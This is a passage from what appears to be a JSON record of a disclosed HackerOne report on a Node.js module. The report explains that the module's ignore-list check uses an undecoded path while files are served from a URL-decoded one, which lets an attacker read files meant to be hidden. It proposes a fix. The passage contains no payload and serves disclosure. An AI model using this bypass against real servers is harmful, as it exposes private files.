<span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n<span class=\"mi\">91</span>    <span class=\"k\">return</span> <span class=\"o\">!</span><span class=\"nx\">pathname</span><span class=\"p\">.</span><span class=\"nx\">includes</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">)</span>\n<span class=\"mi\">92</span>  <span class=\"p\">})</span>\n</code></pre>\n<p>Line <code>91</code> handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable <code>pathname</code> is used. This variable is not url decoded, while the variable which is used to actually serve the file is named <code>related</code> and is url decoded by passing requested path through <code>decodeURIComponent</code> function.<br>\nSo one strategy would be to use the <code>related</code> variable for checking against the blacklist too.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The issue essentially bypasses the <code>ignore files/folders</code> feature and allows an attacker to read from a directory/file that the victim has not allowed access to.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
